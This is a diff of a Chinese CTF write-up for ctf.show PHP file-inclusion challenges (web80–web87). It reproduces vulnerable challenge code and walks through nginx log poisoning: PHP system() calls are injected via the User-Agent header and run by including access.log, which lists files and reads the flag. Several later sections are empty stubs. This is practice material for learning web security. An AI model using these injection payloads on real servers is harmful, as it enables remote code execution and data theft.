@@ -136,9 +136,154 @@ if(isset($_GET['file'])){
 
 <figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
-这次不止过滤了php，还过滤了data，所以现在只能使用
+这次不止过滤了php，还过滤了data，所以得用日志包含，我们现在需要知道这个用的什么框架。我们可以用linux的whatweb指令
+
+```sh
+whatweb http://ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show/ 
+```
+
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+
+可以从上面看到有nginx，nginx在linux下面的日志目录在/var/log/nginx/access.log中，并且会包含user-agent和路径。
+
+我们需要向这个文件中写入我们的php代码，比如查看一下源代码或者写入一句话木马。这里我选择执行指令。
+
+```http
+GET /?file=/var/log/nginx/access.log HTTP/1.1
+Host: ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show
+User-Agent: <?php system('ls');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
 
 ```
+
+<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
+可以看到我们的代码起作用了，后面显示了我们当前目录下的文件，有fl0g.php。我们接下来只要查看flag.php的源代码就可以了，直接cat flag.php,
+
+这里介绍一个指令可以直接把文件的以base64编码的形式输出
+
+```sh
+base64 file
+```
+
+所以我们最后的头部的结果就是
+
+```http
+GET /?file=/var/log/nginx/access.log HTTP/1.1
+Host: ed2a102a-36b7-4969-b43f-eac4d7abef51.challenge.ctf.show
+User-Agent: <?php system('cat fl0g.php');?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+```
+
+<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:purple;background-color:green;">（4）WEB81</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 15:51:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+
+上一题的包含日志我们还能用，一样的，不知道为什么我的环境突然做不了了，但是结果就是上一题一样的wp。
+
+***
+
+## <mark style="color:purple;background-color:green;">（5）web82</mark>
+
+这题是条件竞争，我们
+
+
+
+## <mark style="color:purple;background-color:green;">（6）WEB 83</mark>
+
+
+
+
+
+## <mark style="color:purple;background-color:green;">（7）WEB 84</mark>
+
+
+
+
+
+## <mark style="color:purple;background-color:green;">（8）WEB 85</mark>
+
+
+
+
+
+## <mark style="color:purple;background-color:green;">（9）WEB 86</mark>
+
+
+
+
+
+## <mark style="color:purple;background-color:green;">（10）WEB87</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 21:57:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $content = $_POST['content'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    $file = str_replace(".", "???", $file);
+    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
+
+    
+}else{
+    highlight_file(__FILE__);
+} 
 ```
 
 
@@ -147,27 +292,8 @@ if(isset($_GET['file'])){
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+```http
+```
 
 
 
